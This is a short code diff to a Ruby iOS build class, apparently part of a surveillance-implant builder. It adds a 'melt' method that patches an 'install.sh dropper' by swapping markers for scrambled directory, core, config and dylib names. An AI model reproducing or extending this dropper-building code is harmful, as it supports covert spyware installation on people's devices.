@@ -46,7 +46,39 @@ class BuildIOS < Build
   end
 
   def melt(params)
-    trace :debug, "#{self.class} #{__method__}"
+    trace :debug, "Build: melting: #{params}"
+
+    # open the install.sh dropper and patch the value of the files to be installed
+    file = File.open(path('install.sh'), 'rb+')
+    content = file.read
+
+    begin
+      content['[:RCS_DIR:]'] = @scrambled[:dir]
+    rescue
+      raise "Install Dir marker not found"
+    end
+
+    begin
+      content['[:RCS_CORE:]'] = @scrambled[:core]
+    rescue
+      raise "Core marker not found"
+    end
+
+    begin
+      content['[:RCS_CONF:]'] = @scrambled[:config]
+    rescue
+      raise "Config marker not found"
+    end
+
+    begin
+      content['[:RCS_DYLIB:]'] = @scrambled[:dylib]
+    rescue
+      raise "Dylib marker not found"
+    end
+    
+    file.rewind
+    file.write content
+    file.close
   end
 
 end
